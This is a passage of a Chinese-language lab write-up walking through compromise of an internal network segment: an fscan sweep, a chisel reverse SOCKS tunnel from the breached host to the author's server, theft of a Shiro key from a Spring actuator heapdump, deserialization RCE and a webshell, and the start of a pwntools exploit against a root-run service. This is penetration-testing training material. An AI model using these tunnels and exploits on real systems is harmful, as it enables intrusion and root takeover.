d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>使用 <code>fscan</code> 进行扫描</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">172.28.23.0/24</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">start infoscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">trying RunIcmp2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The current user permissions unable to send icmp packets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start </span><span class="token function" style="color:#d73a49">ping</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">icmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Target </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.17    is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">icmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Target </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.26    is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">icmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Target </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.33    is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Icmp alive hosts len is: </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.33:8080 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.17:8080 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.26:80 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.33:22 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.26:22 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.17:80 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.17:22 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.26:21 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> alive ports len is: </span><span class="token number" style="color:#36acaa">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start vulscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle http://172.28.23.17       code:200 len:10887  title:</span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle http://172.28.23.17:8080  code:200 len:1027   title:Login Form</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle http://172.28.23.26       code:200 len:13693  title: 新翔 OA 管理系统 - OA 管理平台联系电话：13849422648 微信同号，QQ958756413</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ftp</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.26:21:anonymous</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">OASystem.zip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle http://172.28.23.33:8080  code:302 len:0      title:None 跳转 url: http://172.28.23.33:8080/login</span><span class="token punctuation" style="color:#393A34">;</span><span class="token assign-left variable" style="color:#36acaa">jsessionid</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">363B8F8B96F639A14C8B7F4646D27459</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle http://172.28.23.33:8080/login</span><span class="token punctuation" style="color:#393A34">;</span><span class="token assign-left variable" style="color:#36acaa">jsessionid</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">363B8F8B96F639A14C8B7F4646D27459 code:200 len:3860   title: 智联科技 ERP 后台登陆</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> PocScan http://172.28.23.17:8080 poc-yaml-thinkphp5023-method-rce poc1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> PocScan http://172.28.23.33:8080 poc-yaml-spring-actuator-heapdump-file</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> PocScan http://172.28.23.33:8080 poc-yaml-springboot-env-unauth spring2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="1722823024-建立中转枢纽">172.28.23.0/24 建立中转枢纽<a href="#1722823024-建立中转枢纽" class="hash-link" aria-label="172.28.23.0/24 建立中转枢纽的直接链接" title="172.28.23.0/24 建立中转枢纽的直接链接">​</a></h2>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">vps</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@jmt-projekt:~</span><span class="token comment" style="color:#999988;font-style:italic"># ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse &amp;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root@jmt-projekt:~</span><span class="token comment" style="color:#999988;font-style:italic"># 2024/08/16 10:58:03 server: Reverse tunnelling enabled</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">10</span><span class="token plain">:58:03 server: Fingerprint D9Wm+jW4SsG7MFgviTnkO7s3S7aNEYPubfsRa+k9pBM</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">10</span><span class="token plain">:58:03 server: Listening on http://0.0.0.0:1337</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后将 <code>chisel_1.9.1_linux_amd64</code> 传输到入口点靶机之后，执行连接</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">入口点</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@portal:/tmp$ ./chisel_1.9.1_linux_amd64 client </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:1337 R:0.0.0.0:10000:socks </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">10</span><span class="token plain">:59:36 client: Connecting to ws://139.*.*.*:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">10</span><span class="token plain">:59:36 client: Connected </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Latency </span><span class="token number" style="color:#36acaa">46</span><span class="token plain">.289192ms</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>成功建立 socks 代理</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="172282333-springboot">172.28.23.33 Springboot<a href="#172282333-springboot" class="hash-link" aria-label="172.28.23.33 Springboot的直接链接" title="172.28.23.33 Springboot的直接链接">​</a></h2>
<p>根据 <code>fscan</code> 的扫描结果，存在有 <code>poc-yaml-spring-actuator-heapdump-file</code> 信息泄露，尝试获取</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 </span><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> http://172.28.23.33:8080/actuator/heapdump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ </span><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-jar</span><span class="token plain"> ./tools/JDumpSpider-1.1-SNAPSHOT-full.jar ./heapdump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CookieRememberMeManager</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ShiroKey</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">algMode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> GCM, key </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> AZYyIgMYhG6/CzIJlvpR2g</span><span class="token operator" style="color:#393A34">==</span><span class="token plain">, algName </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> AES</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在 heapdump 文件中获取到了 Shiro 框架的 key 之后，就可以执行反序列化 RCE</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240819-111954-34e7b9a8c3b8b9a8301e30010beeafda.png" width="1504" height="1247" class="img_ev3q"></p>
<p>尝试写入 webshell</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240821-112158-7a134489cc0b1edfbd608b3aba55b2e8.png" width="1504" height="1247" class="img_ev3q"></p>
<p>尝试连接</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240822-112239-54ccf88732f8a6d332fbff35d88a8b3c.png" width="1544" height="1042" class="img_ev3q"></p>
<p>成功 getshell</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="172282333-二进制服务程序攻击">172.28.23.33 二进制服务程序攻击<a href="#172282333-二进制服务程序攻击" class="hash-link" aria-label="172.28.23.33 二进制服务程序攻击的直接链接" title="172.28.23.33 二进制服务程序攻击的直接链接">​</a></h2>
<p>尝试探测目标靶机的所有服务</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240824-112454-0df8afba1f549e78f1623573bdf3cc19.png" width="1544" height="1042" class="img_ev3q"></p>
<p>尝试连接位于 <code>59696</code> 端口的服务</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.33 </span><span class="token number" style="color:#36acaa">59696</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> config </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> found: /etc/proxychains4.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> DLL init: proxychains-ng </span><span class="token number" style="color:#36acaa">4.17</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10000  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.33:59696  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection established</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server time: Fri Aug </span><span class="token number" style="color:#36acaa">16</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11</span><span class="token plain">:26:17 </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username: </span><span class="token number" style="color:#36acaa">123</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password: </span><span class="token number" style="color:#36acaa">123</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Unauthorized</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>怀疑是二进制 pwn 攻击，定位到服务位于 <code>/home/ops01/HashNote</code> 文件（无法使用 <code>lsof</code> 或者 <code>ss</code> 进行定位，因为权限不足）</p>
<p>这也说明这个服务是以 root 权限运行的，如果借助 pwn 攻击拿下服务的话，就可以直接获得 root 权限</p>
<p>将程序下载到本地进行分析之后，编写攻击脚本</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">elf </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./HashNote&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">arch</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">elf</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">arch</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> os</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;linux&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> log_level</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;debug&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># p = process(&#x27;./HashNote&#x27;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> remote</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;172.28.23.33&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">59696</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">send_command</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">command</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;:&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">command</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">add_entry</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    send_command</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;Key:&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> key</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;Data:&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">get_entry</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    send_command</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;Key:&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> key</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">update_entry</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    send_command</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;Key:&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> key</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;Data:&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">set_username</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    send_command</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token 